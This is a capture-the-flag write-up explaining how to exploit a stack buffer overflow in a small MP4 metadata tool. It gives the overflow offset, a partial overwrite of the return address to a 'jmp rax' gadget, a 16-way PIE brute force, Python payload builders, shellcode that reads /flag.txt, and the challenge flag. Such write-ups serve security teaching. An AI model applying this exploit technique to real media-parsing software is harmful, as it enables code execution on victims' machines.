# Video Killed the PWN Star Writeup

## Description

My friend Elias is ceaseless watching videos on his phone! So much so that he built a little tool for checking their metadata. What could go wrong?

## Solution Walkthrough

1. **Step 1**：

    There is a stack buffer inside `parse_uuid_raw()`:

    ```c
    char uuid_buffer[BUFFER_SIZE];
    ```

    BUFFER_SIZE:

    ```c
    #define BUFFER_SIZE 256
    ```

    Therefore, as long as we create a very large uuid box, we can make `fread()` read more than 256 bytes into uuid_buffer, causing a stack overflow.

2. **Step 2**：

    The MP4 box format:

    ```text
    4 bytes size
    4 bytes type
    payload
    ```

    The uuid box format:

    ```text
    4 bytes size
    4 bytes "uuid"
    16 bytes UUID
    payload
    ```

    This program only processes uuid boxes whose UUID is equal to TARGET_UUID:

    ```c
    static const uint8_t TARGET_UUID[16] = {
        0x44, 0x41, 0x4c, 0x43, 0x54, 0x46, 0x32, 0x30,
        0x32, 0x36, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00
    };
    ```

    Therefore, the exploit needs to append a properly formatted uuid box after a normal MP4 file, and place the overflow payload inside the payload section of this box.

    Python:

    ```python
    def uuid_box(payload: bytes) -> bytes:
        return struct.pack(">I", 24 + len(payload)) + b"uuid" + target + payload
    ```

3. **Step 3**：

    According to the analysis, the distance from `uuid_buffer` to the saved RIP is:

    ```python
    offset = 0x118
    ```

    Therefore, the payload order is:

    ```text
    shellcode
    padding
    partial overwrite saved RIP
    ```

   This binary has PIE enabled, so the program's base address is randomized.

   The target gadget is:

   ```python
   jmp = 0x126f
   ```

   This is the PIE-relative gadget inside the binary:

   ```asm
   jmp rax
   ```

   Therefore, the actual address of the gadget will be:

   ```text
   PIE base + 0x126f
   ```

   However, because PIE is enabled, we do not know the full PIE base.
   So here we use a partial overwrite and only overwrite the lower 2 bytes of the saved RIP.

   Code:

   ```python
   def make_payload(page_nibble: int) -> bytes:
        low16 = ((page_nibble << 12) + jmp) & 0xffff
        return shell + b"A" * (offset - len(shell)) + struct.pack("<H", low16)
   ```

   The final:

   ```python
   struct.pack("<H", low16)
   ```

   only overwrites the lower 16 bits of the saved RIP.

   Since the PIE base is page-aligned, the lower 12 bits of the base address are fixed as 0x000. Therefore, the only truly uncertain part is the remaining 4 bits:

   ```text
   0x0000
   0x1000
   0x2000
   ...
   0xf000
   ```

   Bruteforce the 16 possibilities:

   ```python
   for guess in range(16):
        data = base + uuid_box(make_payload(guess))
        out = outdir / f"pwn_{guess:x}.mp4"
        out.write_bytes(data)
        print(f"wrote {out} ({len(data)} bytes), ret low16=0x{((guess << 12) + jmp) & 0xffff:04x}")
   ```

   Each generated MP4 file attempts to modify the lower 2 bytes of the return address into one possible address of the jmp rax gadget.


4. **Step 4**：

   When `parse_uuid_raw()` calls `fread()`, the payload is read into uuid_buffer on the stack.

   The exploit uses the overflow to overwrite the saved RIP, but only changes the lower 2 bytes of the saved RIP, making the function jump to jmp rax when it returns.

   Then jmp rax jumps back to the shellcode inside the buffer, because rax points to uuid_buffer, allowing us to get the flag.

   Full flow:

   ```text
   place shellcode at the beginning of uuid_buffer
   → fread() reads the payload into uuid_buffer
   → overflow overwrites the lower 2 bytes of saved RIP
   → saved RIP is changed to the jmp rax gadget
   → parse_uuid_raw() returns
   → the program executes jmp rax
   → rax points near the payload / uuid_buffer
   → jmp rax jumps back to shellcode
   → shellcode executes open/read/write
   → prints /flag.txt
   ```

## Flag

```text
dalctf{s0rry_f0r_th3_d3c3pt10n}
```
